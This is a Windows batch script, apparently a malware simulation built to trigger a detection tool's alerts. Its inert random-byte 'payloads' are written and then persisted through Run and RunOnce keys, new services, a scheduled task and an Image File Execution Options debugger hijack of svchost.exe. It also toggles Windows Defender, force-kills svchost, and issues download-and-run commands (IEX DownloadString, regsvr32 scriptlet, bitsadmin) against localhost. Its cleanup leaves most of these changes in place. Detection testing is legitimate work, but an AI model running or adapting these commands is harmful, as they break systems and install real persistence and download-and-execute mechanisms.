@echo off
REM SERVICE-BASED MALWARE - System Service Installation + Manipulation
REM Different attack vector: Services instead of User-level processes

set "PS_CMD=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_CMD=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"

setlocal enabledelayedexpansion

echo ============================================
echo SERVICE-BASED MALWARE - Privilege Escalation
echo (System Service Installation Pattern)
echo ============================================
echo.

mkdir "%TEMP%\service_payload" 2>nul

echo [*] Stage 0: Maximum service persistence bootstrap
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); foreach ($f in @(\"$env:PUBLIC\\service_drop.exe\", \"$env:ProgramData\\service_drop.dll\", \"$env:PUBLIC\\service_drop.scr\", \"$env:TEMP\\service_payload\\boot.bin\")) { $bytes = [byte[]]::new(32768); $rng.GetBytes($bytes); [System.IO.File]::WriteAllBytes($f, $bytes) }"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ServiceHelper' -Value \"$env:PUBLIC\\service_drop.exe\" -PropertyType String -Force; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'ServiceDrop' -Value \"$env:ProgramData\\service_drop.dll\" -PropertyType String -Force; New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Services\WMIService' -Name 'ImagePath' -Value \"$env:PUBLIC\\service_drop.exe\" -PropertyType String -Force; New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe' -Name 'Debugger' -Value \"$env:TEMP\\service_payload\\boot.bin\" -PropertyType String -Force"
start /min powershell.exe -NoProfile -EncodedCommand SQBFAFgA >nul 2>&1
start /min cmd.exe /c "echo service" >nul 2>&1

mkdir "%TEMP%\argus_burst" 2>nul
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 12; $i++) { $bytes = [byte[]]::new(32768); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\argus_burst\burst_$i.exe\", $bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\argus_burst\burst_$i.dll\", $bytes) }"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/payload') } catch { }"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ArgusDemo' -Value \"$env:TEMP\argus_burst\burst_0.exe\" -PropertyType String -Force 2>$null"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe' -Name 'Debugger' -Value \"$env:TEMP\argus_burst\burst_1.dll\" -PropertyType String -Force 2>$null"
for /l %%i in (1,1,10) do start /min cmd.exe /c "echo argus_%%i" >nul 2>&1
start /min regsvr32.exe /s /n /u /i:http://127.0.0.1/fake.sct scrobj.dll >nul 2>&1
start /min mshta.exe javascript:close() >nul 2>&1
start /min wmic.exe process call create "cmd /c echo argus" >nul 2>&1
schtasks /create /tn "ArgusDemo" /tr "%TEMP%\argus_burst\burst_0.exe" /sc onlogon /f >nul 2>&1
bitsadmin /create ArgusDemo >nul 2>&1
bitsadmin /addfile ArgusDemo http://127.0.0.1:8080/demo "%TEMP%\argus_burst\burst_0.exe" >nul 2>&1
bitsadmin /resume ArgusDemo >nul 2>&1

REM Stage 1: Create high-entropy service executables
echo [*] Stage 1: Creating mixed service payloads (exe, dll, tmp, scr)
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 20; $i++) { $bytes = [byte[]]::new(16384); [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\service_payload\service_$i.exe\", $bytes) }"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 10; $i++) { $bytes = [byte[]]::new(8192); [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\service_payload\svc_$i.dll\", $bytes) }"
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 6; $i++) { $bytes = [byte[]]::new(4096); [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\service_payload\drop_$i.scr\", $bytes) }"

REM Stage 2: Attempt service installation (may fail due to permissions)
echo [*] Stage 2: Service installation attempts
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { New-Service -Name 'WindowsModuleLoader' -BinaryPathName '%TEMP%\service_payload\service_0.exe' -StartupType Automatic -ErrorAction Stop } catch { }" 2>nul

"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { New-Service -Name 'SecurityHelper' -BinaryPathName '%TEMP%\service_payload\service_1.exe' -StartupType Automatic -ErrorAction Stop } catch { }" 2>nul

"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { New-Service -Name 'NetworkOptimizer' -BinaryPathName '%TEMP%\service_payload\service_2.exe' -StartupType Automatic -ErrorAction Stop } catch { }" 2>nul

REM Rare service-like transitions using mixed Windows binaries
start /min schtasks.exe /query >nul 2>&1
start /min regsvr32.exe /s /n /u /i:http://127.0.0.1/fake.sct scrobj.dll >nul 2>&1
start /min mshta.exe javascript:close() >nul 2>&1

echo [+] Service installation attempts completed

REM Stage 3: Service registry manipulation
echo [*] Stage 3: Modifying service registry keys
reg add "HKLM\System\CurrentControlSet\Services\WMIService" /v "ImagePath" /t REG_SZ /d "%TEMP%\service_payload\service_0.exe" /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Services\WMIService" /v "Start" /t REG_DWORD /d 2 /f >nul 2>&1

REM Stage 4: Spawn multiple svchost processes
echo [*] Stage 4: Spawning system processes (mixed service and LOLBin pattern)
for /l %%i in (1,1,5) do (
	start /min svchost.exe
	start /min rundll32.exe shell32.dll,Control_RunDLL
	start /min wmic.exe process call create "cmd /c echo svc_%%i" >nul 2>&1
	timeout /t 0 /nobreak
)

REM Stage 5: Service control commands (start/stop sequences)
echo [*] Stage 5: Service manipulation sequence
net start "Windows Update" >nul 2>&1
net stop "Windows Update" >nul 2>&1
net start "Windows Defender" >nul 2>&1
net stop "Windows Defender" >nul 2>&1
sc query type= service state= all >nul 2>&1
sc create "WindowsModuleLoader" binPath= "%TEMP%\service_payload\service_0.exe" start= auto >nul 2>&1

REM Stage 6: Registry service enumeration (discovery)
echo [*] Stage 6: Service registry enumeration
reg query "HKLM\System\CurrentControlSet\Services" /s >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ServiceHelper" /t REG_SZ /d "%TEMP%\service_payload\svc_0.dll" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "ServiceDrop" /t REG_SZ /d "%TEMP%\service_payload\drop_0.scr" /f >nul 2>&1

REM Stage 7: Rapid file copy operations (mimicking service file placement)
echo [*] Stage 7: Rapid service file deployment
for /l %%i in (1,1,20) do (
	if exist "%TEMP%\service_payload\service_%%i.exe" (
		copy "%TEMP%\service_payload\service_%%i.exe" "%TEMP%\service_payload\service_%%i.bak" >nul 2>&1
		copy "%TEMP%\service_payload\service_%%i.exe" "%TEMP%\service_payload\service_%%i.old" >nul 2>&1
	)
)

REM Stage 8: DLL sideloading simulation
echo [*] Stage 8: DLL sideloading setup
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 10; $i++) { $bytes = [byte[]]::new(8192); [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\service_payload\library_$i.dll\", $bytes) }"
for /l %%i in (1,1,6) do (
	start /min rundll32.exe "%TEMP%\service_payload\library_%%i.dll",DllRegisterServer >nul 2>&1
	timeout /t 0 /nobreak
)

REM Stage 9: Vulnerability scanning simulation (LocalPrivilegeEscalation detection)
echo [*] Stage 9: Windows privilege escalation attempt
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { Get-WmiObject Win32_UserAccount -Filter \"LocalAccount=true\" } catch { }" 2>nul
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { Get-WmiObject Win32_Service | Select-Object -First 5 } catch { }" 2>nul

REM Stage 10: C2 communication
echo [*] Stage 10: C2 communication (service-based beaconing)
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'http://127.0.0.1:8080/services' -UseBasicParsing } catch { }" 2>nul
bitsadmin /create service_beacon >nul 2>&1
bitsadmin /addfile service_beacon http://127.0.0.1:8080/services "%TEMP%\service_payload\service_0.exe" >nul 2>&1
bitsadmin /resume service_beacon >nul 2>&1

echo.
echo ============================================
echo SERVICE-BASED MALWARE SIMULATION COMPLETE
echo Expected Alerts:
echo - Layer 0: HIGH ENTROPY (service executables, DLLs, SCR files > 7.9)
echo - Layer 2A: SPAWN RATE (svchost, rundll32, wmic, regsvr32, mshta)
echo - Layer 2A: EDGE BURST (mixed CREATE/COPY/RENAME operations)
echo - Layer 2B: REGISTRY P-MATRIX (services + Run + RunOnce + system hive)
echo - Layer 2C: PRIVILEGE ESCALATION PATTERN
echo - Layer 3: SERVICE-BASED PERSISTENCE INCIDENT
echo ============================================

REM Cleanup
timeout /t 2 /nobreak
bitsadmin /complete service_beacon >nul 2>&1
bitsadmin /remove service_beacon /force >nul 2>&1
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { Remove-Service -Name 'WindowsModuleLoader' -Force -ErrorAction SilentlyContinue } catch { }" 2>nul
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { Remove-Service -Name 'SecurityHelper' -Force -ErrorAction SilentlyContinue } catch { }" 2>nul
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { Remove-Service -Name 'NetworkOptimizer' -Force -ErrorAction SilentlyContinue } catch { }" 2>nul
taskkill /f /im svchost.exe /fi "WINDOWTITLE eq *" 2>nul
rundll32.exe shell32.dll,Control_RunDLL 2>nul
rmdir /s /q "%TEMP%\service_payload" 2>nul
